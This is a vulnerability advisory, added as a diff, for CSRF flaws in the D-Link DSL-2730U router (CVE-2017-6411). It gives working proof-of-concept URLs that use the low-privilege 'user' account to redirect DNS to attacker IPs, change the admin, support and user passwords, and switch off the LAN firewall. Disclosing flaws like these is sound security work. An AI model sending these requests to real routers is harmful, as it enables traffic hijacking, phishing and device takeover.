@@ -1,0 +1,120 @@
+Author		: 	B GOVIND
+Exploit Title	: 	DLink DSL-2730U Wireless N 150, Change DNS Configuration  bypassing ‘admin’ privilege
+Date		: 	01-03-2017
+Vendor Homepage	: http://www.dlink.co.in
+Firmware Link	: ftp://support.dlink.co.in/firmware/DSL-2730U
+Affected version	:  Hardware ver C1, Firmware ver: IN_1.0.0
+Email id	: govindnair7102@gmail.com 
+CVE		:  CVE-2017-6411
+
+Change DNS Configuration Bypassing ‘admin’ Privilege
+-------------------------------------------------------
+
+D-Link DSL-2730U wireless router is a very popular SOHO network device used in India. This device has three default accounts ‘admin’, ‘support’ and ‘user’. As per D-Link only “admin" account has unrestricted access to change configuration of device. Account name ‘user’ can just view configuration settings and statistics.
+
+1.	Description of Vulnerability
+
+Cross Site Request Forgery can be used to manipulate dnscfg.cgi in this device. An insider / external attacker (remote management to be enabled for external attacker) can change primary and secondary DNS IP address to some malicious IP address without using ‘admin’ account. 
+
+2.	Proof of Concept	
+
+Use following URL to modify the DNS entries:
+
+	http://user:user@192.168.1.1/dnscfg.cgi?dnsPrimary=x.x.x.x&dnsSecondary=y.y.y.y&dnsIfcsList=&dnsRefresh=1
+
+	Here x.x.x.x and y.y.y.y are the malicious IP address attacker can use.
+
+
+
+3.	Impact of vulnerability
+	
+Information Disclosure:  An attacker exploiting this vulnerability can obtain confidential information like users browsing profile. Modifying device DNS settings allows cybercriminals to perform malicious activities like the following:
+
+(a)	 Redirect user traffic to malicious/fake sites. These sites can be phishing pages that spoofs well-known sites and tricks users into submit sensitive user credentials like banks account username and password.
+
+(b)	This can ensure that no more patches are updated from OS vendor sites or firewall sites.
+
+(c)	Replace ads on legitimate sites and serve users with unwanted/fake ads.
+
+(d)	Pushing malwares.
+
+4.	Solution
+
+As per D-Link India this is the only no updated firmware is available for this hardware version which can mitigate this vulnerability which avoids privilege escalation. 
+All users of this hardware should change default passwords of not just ‘admin’ account but also ‘user’ and ‘support’
+
+Change All Account Password Bypassing ‘admin’ Privilege
+----------------------------------------------------------
+ 
+    D-Link DSL-2730U wireless router is a very popular SOHO network device used in India. This device has three default accounts ‘admin’, ‘support’ and ‘user’. As per D-Link only “admin" account has unrestricted access to change configuration of device. Account name ‘user’ can just view configuration settings and statistics. Default password of admin, support and user account are admin, support and user respectively.
+ 
+1.  Description of Vulnerability
+ 
+    Cross Site Request Forgery can be used to manipulate password.cgi in this device. An insider / external attacker (remote management to be enabled for external attacker) can change password of all the three accounts without using ‘admin’ account. 
+ 
+2.  Proof of Concept    
+ 
+This exploit works only when accounts are using default password.
+ 
+Use following URL to change  ‘admin’ account password from ‘admin’ to 
+‘admin1’.
+ 
+    http://user:user@192.168.1.1/password.cgi?
+inUserName=admin&inPassword=ZGFyZWFkbWluMQ==&inOrgPassword=ZGFyZWFkbWlu
+ 
+(b) Use following URL to change ‘support’ account password from ‘support’ to 
+‘support1’.
+ 
+http://user:user@192.168.1.1/password.cgi?
+inUserName=support&inPassword=ZGFyZXN1cHBvcnQx&inOrgPassword=ZGFyZXN1cHBvcnQ=
+ 
+(c) Use following URL to change ‘user’ account password from ‘user’ to 
+‘user1’.
+ 
+http://user:user@192.168.1.1/password.cgi?
+inUserName=user&inPassword=ZGFyZXVzZXIx&inOrgPassword=ZGFyZXVzZXI=
+ 
+Here ‘inPassword’ is the new password and ‘inOrgPassword’ is the existing password. Both these password strings are base64 encoded for confidentiality as connection between browser and web server is using http.
+ 
+ 
+3.  Impact of vulnerability
+     
+Elevation of privilege, Information Disclosure, Denial Of service
+ 
+(a) Insider/Attacker can change the passwords of all the existing accounts and control the device as required. This will result in attacker having complete control over the device. He can capture traffic of other user and analyse traffic. Attacker can deny services as per his/her choice.
+ 
+4.  Solution
+ 
+    As per D-Link India this is the only no updated firmware available for this hardware version which can mitigate this vulnerability. All users of this hardware should change default passwords of all the default accounts.
+
+
+Enable/Disable LAN side Firewall without admin privilege
+---------------------------------------------------------
+
+	D-Link DSL-2730U wireless router is a very popular SOHO network device used in India. This device has three default accounts ‘admin’, ‘support’ and ‘user’. As per D-Link only “admin" account has unrestricted access to change configuration of device. Account name ‘user’ can just view configuration settings and statistics. Default password of admin, support and user account are admin, support and user respectively.
+
+1.	Description of Vulnerability
+
+	Cross Site Request Forgery can be used to manipulate lancfg2.cgi in this device. An insider / external attacker (remote management to be enabled for external attacker) can enable/disable LAN side firewall without ‘admin’ privilege using ‘user ‘ account. 
+
+2.	Proof of Concept	
+
+   Use following URL to enable LAN side firewall
+
+	http://user:user@192.168.1.1/lancfg2.cgi?ethIpAddress=192.168.1.1&eth SubnetMask=255.255.255.0&enblLanFirewall=1&enblIgmpSnp=0&enblIgmpMode=0&dhcpEthStart=192.168.1.2&dhcpEthEnd=192.168.1.254&dhcpLeasedTime=86400&enblDhcpSrv=1&enblLan2=0&enblLanDns=0
+
+
+
+Use following URL to disable LAN side firewall
+
+http://user:user@192.168.1.1/lancfg2.cgi?ethIpAddress=192.168.1.1&ethSubnetMask=255.255.255.0&enblLanFirewall=0&enblIgmpSnp=0&enblIgmpMode=0&dhcpEthStart=192.168.1.2&dhcpEthEnd=192.168.1.254&dhcpLeasedTime=86400&enblDhcpSrv=1&enblLan2=0&enblLanDns=0
+
+
+3.	Impact of vulnerability
+	
+By disabling LAN side firewall and by enabling Port Triggering, an attacker can ensure a backdoor access within LAN side as well as from WAN side.
+Attacker can run port scanning tools to map services which otherwise wont be possible with firewall enabled.
+
+4.	Solution
+
+	As per D-Link India this is the only no updated firmware available for this hardware version which can mitigate this vulnerability. All users of this hardware should change default passwords of all the default accounts.
